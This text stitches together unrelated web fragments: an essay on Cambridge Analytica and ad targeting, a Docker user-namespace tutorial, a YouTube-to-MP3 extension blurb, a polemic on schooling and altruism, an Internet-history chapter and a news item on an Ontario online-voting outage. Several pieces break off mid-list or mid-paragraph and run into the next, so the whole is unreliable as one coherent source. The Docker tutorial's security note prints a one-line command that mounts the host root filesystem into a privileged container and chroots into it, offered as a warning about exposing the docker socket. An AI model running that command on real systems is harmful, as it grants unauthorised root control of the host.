<p>Personality based advertising is based on a simple five dimensional model of human beings, designed to explain behaviours as diverse as reading books and going to clubs. Facebooks machine learning algorithms create a high dimensional model finely tuned with thousands of data points trying to optimise for very specific outcomes, such as purchasing a MAGA hat. The former is a general descriptive model built using statistical methods of the mid 20th century, with some but overall limited predictive general validity. The latter is a highly specialised machine learning model, with little descriptive power, but lot more accurate at predicting specific behaviours like the purchases of haircuts.</p>

<h2 id="digital-advertising-in-practice">Digital advertising in practice</h2>

<p>Keeping that in mind, which of these two digital approaches do you think will yield better results?</p>

<ul>
<li>Approach A: Summon the best psychologists and copywriters in the world to write copy that will get extroverted people to purchase a brand of deodorant. Target highly extroverted people on Facebook with that copy by advertising to people who have “liked” highly extroverted pages.</li>
<li>Approach B: Using Facebook’s machine learning algorithms generate a Lookalike audience based on previous purchasers on your site. Target these people with thousands of different types of programmatically generated messages, and focus on the better performing ones.</li>
</ul>

<p>When I researched this in 2015 I found that Approach B will perform better at all times. In fact, Approach B is more like what Trump&nbsp;<a href="https://www.theatlantic.com/technology/archive/2020/04/how-facebooks-ad-technology-helps-trump-win/606403/">actually did in 2016</a>:</p>

<p><em>“During the 2016 election cycle, Trump’s team ran 5.9 million ads on Facebook, spending $44 million from June to November alone. Hillary Clinton’s campaign ran only 66,000.”</em></p>

<p>Instead of trying a fancy secret sauce on how to design creatives and how to target them Trump’s team just threw everything at the algorithm and stuck with the ads that performed the best. All the psychological theory in the world has limited efficiency compared to the AI powering Facebook’s ad optimisations.</p>

<h2 id="so-what-do-i-think">So what do I think?</h2>

<p>In conclusion, it is not that psychographic advertising doesn’t work at all. The science behind it is solid, and it is worthy of study. My point is that psychographic advertising afforded Cambridge Analytica little to no advantage at all. Cambridge Analytica was working with more or less the same technology as their competitors. Most of the outlandish claims made by Cambridge Analytica were just branding, and subsequently sensationalism by reporting journalists. These are not just my conclusions by the way, they are also the findings of the&nbsp;<a href="https://ico.org.uk/media/action-weve-taken/2618383/20201002_ico-o-ed-l-rtl-0181_to-julian-knight-mp.pdf">British Information Commissioner’s Office</a>&nbsp;(excellent summary&nbsp;<a href="https://twitter.com/nickconfessore/status/1313853996168351747">here</a>). The “secret sauce” part of this affair should not distract from the wide scale data harvesting of large tech monopolies and the data privacy issues that arise from it.</p>

<!-- /.post-info -->      
<p>Not long ago, I publish <a href="https://www.jujens.eu/posts/en/2017/Feb/15/docker-unix-socket/">an article</a> about using Unix sockets with docker. These sockets where in docker volumes so they could be shared between various containers. The key idea was to change the UID and GID of the user that owns the socket in the container so they match those of the user that built the image. The main issue with this approach is that it requires you to build to container with the user that will run it. This makes the solution not portable.</p>
<p>Hopefully, the Linux kernel allows us to use an alternative to map user id inside the container to a predictable user id outside: user id namespaces. According to <a href="https://en.wikipedia.org/wiki/Linux_namespaces">wikipedia</a>: <cite>Namespaces are a feature of the Linux kernel that isolates and virtualizes system resources of a collection of processes. Examples of resources that can be virtualized include process IDs, hostnames, user IDs, network access, interprocess communication, and filesystems. Namespaces are a fundamental aspect of containers on Linux.</cite></p>
<p>For instance, thanks to the PID namespace, a process run inside a container can "think" it has the PID 1 inside a container while in fact it has another one. The same is true with user namespace: a user can "think" it has the 0 uid (root) while it fact it has the 1000 user id (some standard user). This will allow us to be sure for the files in a docker volumes that:</p>
<ul>
<li>All files belonging to the root user in the container will belong to a user of the system that is not root in the host.</li>
<li>All files belonging to other users in the container will be mapped to predictable uid (more on that latter).</li>
</ul>
<div id="configure-docker">
<h2><a href="#id1">Configure docker</a></h2>
<p>Lets configure docker to do all that.</p>
<p>First we either need to start the docker daemon with the <tt><span>--userns-remap</span> USER</tt> flag or make sure the configuration file of the docker daemon (<tt>/etc/docker/daemon.json</tt>) contains something like:</p>
<pre><span>{</span>
  <span>"userns-remap"</span><span>:</span> <span>"USER"</span>
<span>}</span>
</pre>
<p><strong>Notes:</strong></p>
<ol>
<li>In both cases, <tt>USER</tt> must be a valid user of the system (ie present in <tt>/etc/passwd</tt>).</li>
<li>Don't forget to restart the daemon if you have to edit the file.</li>
</ol>
</div>
<div id="configure-the-subordinate-uid-gid">
<h2><a href="#id2">Configure the subordinate uid/gid</a></h2>
<p><a href="http://man7.org/linux/man-pages/man5/subuid.5.html">subuid</a> and <a href="http://man7.org/linux/man-pages/man5/subgid.5.html">subgid</a> are used to specify the user/group ids an ordinary user can use to configure id mapping in a user namespace. They are written like: <tt>username:id:count</tt>. For instance, with <tt>jenselme:100000:65536</tt> it means that user <tt>jenselme</tt> can use 65536 user ids starting at 100000.</p>
<p>This will be used by docker to properly remap uid in the container to the host. For instance, with <tt>jenselme:100000:65536</tt>, a file with a uid of 33 in the container, will be a file with a uid of 100032 in the host. And you will have access to that file. Neat, isn't it?</p>
<p>Now that we've seen the theory, let's configure them properly. First, edit <tt>/etc/subuid</tt> and add (replace <tt>jenselme</tt> by your own user name):</p>
<pre>jenselme:1000:1
jenselme:100000:65536
</pre>
<p>You should be able to understand the second line. The first one is there for a slightly different purpose: make sure that all files created by root belong to the user with uid 1000. That's me on my machine, you should of course use your uid (you can get it with <tt>id <span>-u</span> USER</tt>). Otherwise, they will belong to uid 100000.</p>
<p>Now, edit <tt>/etc/subgid</tt> and add (replace <tt>jenselme</tt> by your own user name):</p>
<pre>jenselme:982:1
jenselme:100000:65536
</pre>
<p>The second line is the name in both cases. I didn't use <tt>jenselme:1000:1</tt> but <tt>jenselme:982:1</tt>. On my machine, 982 is the gui of the docker group (you can get it with <tt>getent group docker</tt>). This means that all files created by root, will belong to me and to the docker group. This "trick" can be handy if for some reason you need to share files with the docker daemon. For instance, software like <a href="https://traefik.io/">traefic</a> may need to read/write to the docker socket. By default, for this socket we have:</p>
<pre>[root@fastolfe ~]# ll /var/run/docker.sock
srw-rw----. 1 root docker 0 Jun 11 18:18 /var/run/docker.sock
</pre>
<p>This means that if in the outside the container the uid of root and its guid are mapped to those of jenselme, traefic won't be able to communicate with the socket because of the permissions of the file. Map the gid of root in the container to the gid of docker in the host allows us to prevent that issue.</p>
<p><strong>Note on security:</strong> Giving access to the docker socket is a problem from a security standpoint since it allows a container to create new containers thus giving it access to the whole host system <em>with root permissions</em>, eg by running <tt>docker run <span>-it</span> <span>-v</span> <span>--privileged</span> <span>-v</span> <span>/:/host</span> <span>--userns=host</span> fedora chroot /host</tt>. That is why SELinux will prevent the docker socket to be mounted in a volume by default. You should be aware of that when you do this. See <a href="http://danwalsh.livejournal.com/74095.html">this</a> for more on that topic.</p>
</div>
<div id="tests">
<h2><a href="#id3">Tests</a></h2>
<p>Now that we are all set, let's start the docker daemon (or restart it).</p>
<p><strong>Note to SELinux users:</strong> You need to append <tt>Z</tt> (capital z) when mounting the volumes, like this: <tt><span>-v</span> <span>$(pwd)/test:/test/:Z</span></tt>. Otherwise, the SELinux context will not be correct and you won't be able to access the volumes from the container. See <a href="https://www.jujens.eu/posts/2015/May/24/docker/#volumes">this docker tip</a>.</p>
<p>The first thing you should notice is that if you had downloaded images or created containers, you will not see them with <tt>docker images</tt> or <tt>docker ps <span>-a</span></tt>. That's because, when user re-mapping is enabled, all images and containers are located in a dedicated subfolder. On my machine, that is <tt>/var/lib/docker/1000.982</tt>.</p>
<p>Now that we know this is expected, let's try things. Run somewhere:</p>
<pre>docker run -it -v "$(pwd)/test:/test/" nginx /bin/bash
</pre>
<p>This will open a bash prompt as root in the container. Go to the volume with <tt>cd /test</tt> and create a file: <tt>touch rootfile</tt>. If you run a <tt>ls <span>-l</span></tt> inside the container, you should see something like:</p>
<pre>root@02a5bcc1757c:/test# ls -l
total 0
-rw-r--r--. 1 root   root 0 Jun 11 16:25 rootfile
</pre>
<p>Let's check the uid and gid to be sure:</p>
<pre>root@02a5bcc1757c:/test# ls -ln
total 0
-rw-r--r--. 1 0 0 0 Jun 11 16:25 rootfile
</pre>
<p>So the file belongs to root and its uid is 0 as well as its gid.</p>
<p>Now run <tt>ls <span>-l</span></tt> in the host:</p>
<pre>▶ ls -l
total 0
-rw-r--r--. 1 jenselme docker 0 Jun 11 18:25 rootfile
</pre>
<p>Let's check the uid and guid:</p>
<pre>▶ ls -ln
total 0
-rw-r--r--. 1   1000 982 0 Jun 11 18:25 rootfile
</pre>
<p>That's correct. Now let's do the same thing wit the <tt><span>www-data</span></tt> user. First, let's give some permissions on the <tt>/test</tt> folder to the <tt><span>www-data</span></tt> user. Since this is just a test, let's run <tt>chmod 777 /test</tt>. Now, switch to this user with <tt>su <span>-s</span> /bin/bash <span>www-data</span></tt>. You should now be in the <tt>/test</tt> directory connected as <tt><span>www-data</span></tt>. Create a file with <tt>touch <span>www-data-file</span></tt>. You should see something like:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -l
total 0
-rw-r--r--. 1 root     root     0 Jun 11 16:36 rootfile
-rw-r--r--. 1 www-data www-data 0 Jun 11 16:38 www-data-file
</pre>
<p>And:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -ln
total 0
-rw-r--r--. 1  0  0 0 Jun 11 16:36 rootfile
-rw-r--r--. 1 33 33 0 Jun 11 16:38 www-data-file
</pre>
<p>As far as the host is concerned, we have:</p>
<pre>▶ ls -l
total 0
-rw-r--r--. 1 jenselme docker 0 Jun 11 18:36 rootfile
-rw-r--r--. 1   100032 100032 0 Jun 11 18:38 www-data-file
</pre>
<p>And</p>
<pre>▶ ls -ln
total 0
-rw-r--r--. 1   1000    982 0 Jun 11 18:36 rootfile
-rw-r--r--. 1 100032 100032 0 Jun 11 18:38 www-data-file
</pre>
<p>Now let's create some files from the host. For instance, let's do <tt>touch <span>www-data-file-from-host</span></tt>. In the host it currently belongs to the current user. Let's see in the container:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -l
total 0
-rw-r--r--. 1 root     root     0 Jun 11 16:36 rootfile
-rw-r--r--. 1 www-data www-data 0 Jun 11 16:38 www-data-file
-rw-r--r--. 1 root     nogroup  0 Jun 11 16:41 www-data-file-from-host
</pre>
<p>It belongs to <tt>root</tt> and <tt>nogroup</tt> as expected (in the host, the file belongs to <tt>jenselme:jenselme</tt> not <tt>jenselme:docker</tt>, hence the <tt>nogroup</tt>, I could run <tt>chown jenselme:docker <span>www-data-file-from-host</span></tt> to fix the gid). If you check the uid and gid, you will see it is also as expected.</p>
<p>Now let's change the owner of <tt><span>www-data-file-from-host</span></tt> to <tt>100032:100032</tt> with <tt>chown 100032:100032 <span>www-data-file-from-host</span></tt> (this must be run as root to prevent an <em>Operation not permitted</em>). I let you check the owner, uid, gid in the container. You can also check that the <tt><span>www-data</span></tt> user can write in the file with <tt>echo 'test' &gt; <span>www-data-file-from-host</span></tt>.</p>
<p>This looks good isn't it? I found however one dark spot in this. If you try to edit <tt><span>www-data-file-from-host</span></tt> or <tt><span>www-data-file</span></tt> in the host, it will fail with <em>permission denied</em>. As far as I understand the subuid and subgid, this is not normal. If someone has an explanation for this, please leave a comment. I see two workarounds for that:</p>
<ol>
<li><p>The basic:</p>
<blockquote>
<ol>
<li>Create a group with id <tt>100032</tt> (as root): <tt>groupadd <span>-g</span> 100032 <span>docker-www-data</span></tt></li>
<li>Add yourself to this group (as root): <tt>usermod <span>-aG</span> <span>docker-www-data</span> jenselme</tt></li>
<li>Disconnect/reconnect or use the <tt>newgrp <span>docker-www-data</span></tt> command to take this change into account.</li>
<li>Give write permission to the group in the container: <tt>chmod g=rw <span>www-data-file</span></tt></li>
<li>Write in the file.</li>
</ol>
<p><strong>Note:</strong> You cannot do anything about the user since you can only have one user id.</p>
</blockquote>
</li>
<li><p>The elegant: use ACL (Access Control List). See the <a href="#external-links">external links</a> section to learn more about ACL. TL;DR, ACLs are a way to extend the standard permissions of the filesystem. With them, you can set permissions for a file or directory with very thin granularity for each users and groups of the system. To enable ACLs, run as root:</p>
<blockquote>
<ol>
<li><p><tt>setfacl <span>-Rdm</span> u:USER:rwX DIR</tt> (replace <tt>USER</tt> by a username and <tt>DIR</tt> by a path to a directory or file). This will:</p>
<blockquote>
<ul>
<li><tt><span>-R</span></tt> recurse on subfolders.</li>
<li><tt><span>-d</span></tt> default to this rule. This means that the ACL will apply to all files and directories created in <tt>DIR</tt> after the <tt>setfacl</tt> was run.</li>
<li><tt><span>-m</span></tt> modify the rule to <tt>u:USER:rwX</tt> that is give to the user (<tt>u:</tt>) <tt>USER</tt> the permissions <tt>rwX</tt>. The capital <tt>X</tt> means <em>give execution permission to all folders and to files that have the execute permissions</em>. This prevent us to make all files executable.</li>
<li>apply to <tt>DIR</tt></li>
</ul>
</blockquote>
</li>
<li><p><tt>setfacl <span>-Rm</span> u:USER:rwX DIR</tt> (replace <tt>USER</tt> by a username and <tt>DIR</tt> by a path to a directory or file). This will apply the ACL rule on the existing files in <tt>DIR</tt>.</p>
</li>
</ol>
</blockquote>

      <p>
        A server-less chrome extension to convert youtube videos to mp3 files for download. If available, files are persisted to <a href="https://siasky.net/">Sia SkyNet</a> for future downloads by all users.
      </p>
      <p>This Youtube to MP3 chrome extension is different in a few ways:
        </p><ol>
          <li>The conversion takes place on your machine, not a server, so there's no server costs we need to cover with ads</li>
          <li>The conversion logic exists on your machine, and is resilliant to takedowns</li>
          <li>Your conversions are cached with <a href="https://siasky.net/">Sia SkyNet</a> for quick download without conversion in the future by everyone</li>
          <li>This extension <a href="https://github.com/benkaiser/youtube-to-mp3">is open source</a> and available for you to inspect the integrity of it yourself</li>
        </ol>

      <h2>Usage</h2>
      <div>
        <div>
        <p>
          Just navigate to any youtube video and click the "Download MP3" button next to the Subscribe button.
        </p>
        <p>
          If the file has not yet been converted, your machine will download the youtube video and convert it to an mp3. This process may take 30+ seconds depending on video size, your internet connection and your computers processing power. Once the file is converted a download will trigger on your browser for the file.
        </p>
        <p>
          If someone has previously converted the video to mp3 using the extension already, the download will start in just a few seconds.

    <p>The other day, it “clicked” for me: I think I understand better now what schools are really for.</p>

<p>It is generally believed that schools exist to help children learn. Of course, we critical rationalists know that that’s baloney. Instead, we understand—thanks to <em>Taking Children Seriously</em>—that schools exist to <em>standardize</em> children: to get them to replicate society’s memes as faithfully as possible under threat of punishment. Static-society stuff (cf. David Deutsch, <a href="https://www.amazon.com/Beginning-Infinity-Explanations-Transform-World/dp/0143121359/"><em>The Beginning of Infinity</em></a>). At least that was my current understanding of it. But I’m starting to see that it goes deeper than that.</p>

<p>Consider a child who is interested in, say, astronomy. Most elementary schools do not offer astronomy classes. And even if they did, it is highly unlikely that any given child would happen to be interested in <em>all</em> of the things that are shoved down his throat year after year, at just the right time. A child’s interests don’t evolve in sync with the school’s schedule. If the child is lucky, he will be genuinely interested in a few of the topics any given year, but never even close to all of them.</p>

<p>So, the child wants to learn about astronomy—but doesn’t get to. Instead, he is forced to learn <em>other</em> things he <em>isn’t</em> interested in. Day in, day out, for  some 12 years. As Popper said, he has to learn answers to questions he didn’t ask.</p>

<p>A child is then faced with two options: to go insane, or to learn to cope with the situation. So, what can one possibly <em>do</em> in such a situation to stay sane? I see only one solution: one must learn to put one’s <em>own</em> interests on the back burner and prioritize <em>other people’s</em> interests—in this case, the teacher’s, and society’s at large. One must learn to coerce oneself to neglect one’s preferences. I think <em>that</em> is what school is really for: not just to standardize children, but to break them, too, to place others’ interests over their own.</p>

<p>I recently asked a 14 year old close to me if she’d like to go to college. She said no, but that she probably will anyway because she thinks she <em>should</em>. It’s heartbreaking.</p>

<p>It is only after 12 years of mind-numbing boredom and neglecting one’s preferences that people voluntarily spend the next 30, 40, sometimes 50 years at jobs they hate. Forever delaying their dreams is what they’re good at. It is in school that they learn how to live with problems and endure them instead of <em>solving</em> them. It is there that they are taught that their interests have no chance of leading to anything fruitful, so they shut them down quickly.</p>

<p>Parents are often complicit in this. E.g., they take away things that their children enjoy, such as their computers, gameboys, etc, or at least put time limits on them—so that their kids spend less time doing what they <em>want</em> and more of what they allegedly <em>need</em>, which is determined by anyone but the child.</p>

<p>I’m thankful that David Deutsch puts emphasis on <em>fun</em> and <em>interests</em>. They’re hugely underrated.</p>

<p>If school’s main purpose is to teach children how to neglect their own interests and instead pursue other people’s interests, that also explains where <em>altruism</em> comes from—the evil doctrine Rand so eloquently refuted and which, she says, “regards man, in effect, as a sacrificial animal,” quoting Auguste Comte, who coined the term “to mean, specifically, the placing of the interests of others above your own.” (see the YouTube video at the bottom)</p>

<h2>
  The true purpose of schools is to turn children—born individualists—into altruists; to systematically neglect their own interests in favor of others' interests.
</h2>

<p>It is to force children to betray their intellectual integrity. They must “sacrifice [their minds] to what <em>others</em> believe or want to be true.” — Ayn Rand (though she didn’t state this in the context of schooling and children in particular, but society at large)</p>

<p>This true purpose explains why people <em>live for others</em>, and then expect others to do so as well. It’s what they were forced to do during the most formative years of their lives after all!</p>

<p>It explains why so many expect their peers to sacrifice their happiness for the health of others by agreeing to house arrests. Why those who don’t want their salaries to be cut in half by taxes are considered “evil.” Why so many can’t begin to imagine a world without coercion. “If I had to do it, why should anyone else get a free pass?”</p>

<p>I’m guessing that most teachers do not understand this true purpose of school. They become teachers because <a href="https://blog.dennishackethal.com/2020/10/25/the-tragedy-of-children-becoming-teachers.html">they want to “help” children</a>—that is, give children what they allegedly “need.” It is only altruists who can become teachers and perpetuate the cycle. In other words, the memeplex of schools depends on breaking children so successfully that some of them decide to continue the tradition. Not only do teachers not know why they’re contributing to this altruism machine, <em>it relies on teachers not understanding its true nature to keep itself alive.</em> This makes me wonder if schools as a whole are static memeplexes.</p>

<p>I think many experienced critical rationalists, on the other hand, understand school’s true purpose deeply. For me, it was a breakthrough. Though the topic is sad, writing this post was fun. A lot of stuff is beginning to make more sense. I’m pursuing my interests <em>right now</em>. I love critical rationalism.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>And so we reach the conclusion of “The Backbone,” my story of the origins of the Internet<a href="#fn1" id="fnref1"><sup>1</sup></a>. We have seen the basic arc of the Internet’s development from the 1960s to the 1990s – nurtured in its youth by the government, given room to grow to fruition by the unravelling of the power of the Bell system, and finally emerging into public view in a frenzy of growth which smothered all potential competitors. Over the course of those decades, users repeatedly co-opted systems built in order to expand and share access to machine resources (time-sharing operating systems, ARPANET, and NSFNET), to use them instead for interpersonal communication – message boards and electronic mail.</p>
<p>In 1995, the National Science Foundation (NSF) successfully extricated itself from the network operations business while preserving a single, unitary Internet, composed of many heterogeneous but interlaced parts – networks owned by a variety of corporations; and websites and other services provided by an even wider variety of participants: hobbyists, local governments, small businesses, and more.</p>
<p>The Internet’s self-image coalesced in these years of its adolescence. It was distributed, decentralized, and decentralizing. Its most vocal proponents argued that its technological structure, which privileged the edges over the center, would replicate itself in new political structures, eroding the foundations of incumbent institutional power and enabling direct, disintermediated communication and market transactions between individuals. Louis Rossetto, editor of <em>Wired</em>, <em>the</em> magazine of the technologically-enlightened, put it this way:</p>
<blockquote>
<p>This new world is characterized by a new global economy which is inherently anti-hierarchical and decentralist, and disrespects national boundaries or the control of politicians and bureaucrats or power mongerers of any; and by a global, networked consciousness that is creating a new kind of democracy for achieving social consensus that is turning the bankrupt electoral politics we are witnessing this year into a dead end. …a global hive mind that is arriving at a new, spontaneous order<a href="#fn2" id="fnref2"><sup>2</sup></a>.</p>
</blockquote>
<p>This set of libertarian ideas found expression in statements repeated and replicated so often that they became a kind of scripture of the Internet: the book of David Clark (“We reject: kings, presidents, and voting. We believe in: rough consensus and running code.”); the book of John Perry Barlow (“Governments of the Industrial World, you weary giants of flesh and steel, I come from Cyberspace, the new home of Mind. ….You are not welcome among us. You have no sovereignty where we gather.”); the book of John Gilmore (“The Net interprets censorship as damage and routes around it.”).</p>
<p>These ideas took root, as I have said, when the Internet remained yet in its adolescent state – simultaneously a single, interconnected system, yet robustly heterogeneous in its structure at every level. Over the following fifteen years, its heterogeneity would diminish, with power over the network and its applications consolidating in a few key corporations<a href="#fn3" id="fnref3"><sup>3</sup></a>.</p>
<h2 id="boom-networks-consolidate">Boom: Networks Consolidate</h2>
<p>As the popularity of the Internet exploded in the second half of the 1990s, a river of capital flowed into Silicon Valley in search of the huge returns promised by the unheard of yearly growth of digital traffic. The theory of the time held that, because of the global reach of the Internet and the power of network effects (e.g., Metcalfe’s Law), the first mover to occupy any given sector of online business would dominate it. According to this doctrine, short-term losses – even on per-unit sales basis – were irrelevant, even desirable. Only growth mattered, because growth could always be turned into profits later, once all potential competitors had dwindled into irrelevance<a href="#fn4" id="fnref4"><sup>4</sup></a>. This encouraged a gold rush mentality among investors, what we would now call FOMO, and attracted large amounts of money to such questionable enterprises as Priceline, Boo, and eToys, despite their evident lack of profitability.</p>
<p>Underneath this highly visible froth of increased application diversity, however, the deep current of network infrastructure flowed in the opposite direction, towards consolidation. The boom in web properties in the second half of the 1990s found its echo in a boom in fiber optic network construction. The telecom carriers, new and old, all wanted a piece of the exponential growth in data traffic promised by the rocket-like rise of the World Wide Web. The incumbent telecommunications carriers, freed from their silos by the 1996 Telecom Act, did not, as might have been hoped, use the opportunity to unleash their claws in all-out competitive battle, cutting profits to the bone to the benefit of their users. Markets may thrive on competition, but firms much prefer monopoly. And so the RBOCs and long-distance carriers, split apart in 1984, re-assembled themselves into giants with tremendous market power. Southwestern Bell absorbed Ameritech, Pacific Telesis, BellSouth, and finally AT&amp;T, and then took the name of that former parent company. Bell Atlantic and NYNEX merged, then acquired GTE<a href="#fn5" id="fnref5"><sup>5</sup></a>, taking on at the same time a new moniker, Verizon. Of the former RBOCs, only US West remained an independent company.</p>
<p>While Southwestern Bell and Bell Atlantc re-assembled the scattered parts of AT&amp;T into a pair of Frankenstein’s monsters, another would-be giant was busy absorbing the various internet service providers that had flourished in the first half of the 1990s. In 1983, Bernie Ebbers, who had made his first fortune as the owner of a dozen hotels, co-founded Long Distance Discount Services (LDDS) to compete in the market newly opened by the AT&amp;T break-up, targeting long-distance service for small and medium-sized businesses. Over the ensuing decade, LDDS acquired a variety of other competitors, achieving fourth place in size among long-distance carriers behind AT&amp;T, MCI, and Sprint. In the first days of the Internet boom, it took on a new name – WorldCom – thus announcing its newly hubristic ambitions. A new, much more extravagant buying spree ensued, using WorldCom’s its bubble-inflated stock to acquire one major network after another. In 1996, it bought Metropolitan Fiber Systems (MFS), which had itself just acquired major Internet provider UUNET. The acquisition of CompuServe’s network infrastructure from H&amp;R block followed in 1997, along with the acquisition of the former NSFNET backbone operator, ANS, from AOL. The biggest purchase of all came in 1998, when WorldCom merged with MCI. After the market crash – and bankruptcy and scandal and prison<a href="#fn6" id="fnref6"><sup>6</sup></a> – Verizon absorbed the wreckage of Bernie Ebbers’ conglomerate in 2006.</p>
<p>Finally, the cable television providers, though more historically localized in ownership than the rest of the telecom business, underwent a similar trend towards consolidation, with acquisitions across previously siloed markets making possible behemoths like Time Warner and Comcast; the latter became simultaneously the largest internet service provider and the largest pay-TV company in the U.S., to say nothing of its media holdings.</p>
<p>And so, by the mid-2000s, the diverse structure of peer networks which had characterized the early Internet in the U.S. had merged into a handful of major providers. At the retail level, as broadband networking replaced dial-up, most consumers had access to only one or two relevant ISPs – their local telephone and cable company – and nationally two companies dominated each of those sectors; Verizon and AT&amp;T on the one hand, and Comcast and Time Warner on the other.</p>
<h2 id="bust-applications-consolidate">Bust: Applications Consolidate</h2>
<p>Many of the first-generation dot-coms might have survived had they been allowed to grow gradually. But the gold rush theory was antithetical to anything but hypergrowth. So, when the crash came, most were caught with huge expenses and excess capacity due to overinvestment, and they quickly collapsed. A vigorous winnowing took place, with a great deal of chaff sifted out and only a few grains of wheat left behind.</p>
<p>Over the following decade, a new much more stable order emerged. Five giant companies came to dominate the application layer of the Internet. Two of them were dot-com era survivors. Google, founded in 1998, had raised the bar on what it meant to be a search engine by extracting ranking information from the structure of the Web and its skein of links, rather than merely from the content of individual pages. Through a series of further innovations and acquisitions, it leveraged its dominance in search into a powerful position in mobile computing, email, streaming video, and, of course, advertising. Amazon, founded as a book retailer in 1994, developed a world-beating logistical operation which it used to undercut competitors on price and delivery speed, then expanded into virtually every retail sector, and finally created a set of tools for hosting third-party applications that defined the new, and very lucrative, business of cloud computing.</p>
<p>Two of the other giants had come of age during the personal computing era, a decade before the commercial Internet. Microsoft took an early lead in the so-called “browser wars” of the mid-90s, but more important long-term was its continued dominance of business software, even as those businesses began to move their operations on-line. Apple Computer, made largely irrelevant in the 1990s by the dominance of Windows, seemed destined to a gradual decline into senescence. But it was rejuvenated by its successes with the iPod and iTunes, and then developed the most profitable mobile computing device to this day, the iPhone.</p>
<p>The final dominant power, Facebook, was the only one to come out of the second wave boom in Internet investment in the second half of the 2000s. It grew rapidly across college campuses before colonizing the wider world, and becoming the primary way that many millions of people keep in touch with people outside their immediate family and close friends. It has since acquired other …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Bradford West Gwillimbury voters have until Oct. 23 at 8 p.m. to cast their ballots</p><div id="details-body" data-words="437" itemprop="articleBody">
        <p dir="ltr">The company responsible for the online voting system in Bradford West Gwillimbury has blamed the Election Night crash on a slow down caused by a Toronto-based facility.</p>

<p dir="ltr">About 51 municipalities around Ontario started experiencing slow traffic with Dominion Voting Systems around 6 p.m., according to a press release issued by the company late Monday night.</p>

<p dir="ltr">“This load issue was documented, reviewed and determined to be the result of a Toronto-based Internet Colocation provider placing an unauthorized limit on incoming voting traffic that was roughly 1/10th of the system’s designated bandwidth,” read the release.</p>

<p dir="ltr">A co-location provider is a data center facility in which a business can rent space for servers and other computer hardware.</p>

<p dir="ltr">Dominion was unaware of the problem until municipality representatives started contacting it for help and to share complaints from voters, read the release.</p>

<p dir="ltr">“Once we became aware of the problem, Dominion was able to quickly identify the source of the issue and work with the provider to resolve all issues with the system service by 7:30 p.m.,” read the release.</p>

<p dir="ltr">“Unfortunately, the 90-minute slowdown and resulting bandwidth issue caused a varying number of voters to experience slow response times and system time-outs.”</p>

<p dir="ltr">Many communities affected by the crash have extended the voting period. In BWG, residents have until 8 p.m. today to cast their ballots.</p>

<p dir="ltr">The town will also be hosting an Election Night gathering at the Bradford and District Memorial Community Centre at 7:30 p.m.</p>

<p dir="ltr">“Dominion regrets the challenges that our system load issue posed for both election officials and voters alike in today’s elections,” read the Dominion release.</p>

<p dir="ltr">“We want to assure Ontario voters that we will work to ensure this problem does not occur in future elections. It is important to note that at no time was the integrity of the system at risk of compromise, or in any way insecure.”</p>

<p dir="ltr">As of Monday morning, 5,603 votes had been submitted in the BWG municipal election, making up a little more than 23 per cent of the eligible voters, according to Caleigh Clubine, the town’s community relations officer.</p>

<p dir="ltr">At an election gathering Monday evening, several BWG candidates said their confidence in online voting is now lacking.</p>

<p dir="ltr">“If you voted early, it worked really good, (but) you have to have the proper services. You’ll get a large volume (and if you are not prepared for that) you haven’t done your job,” said Ward 4 incumbent Ron Orr.</p>

<p dir="ltr">“Does it shake our confidence in the system? Sure it does,” added Deputy Mayor James Leduc. “I’m frustrated the system wasn’t stress-tested enough. We won’t be strictly online voting again. We’ll have both systems again.”</p>
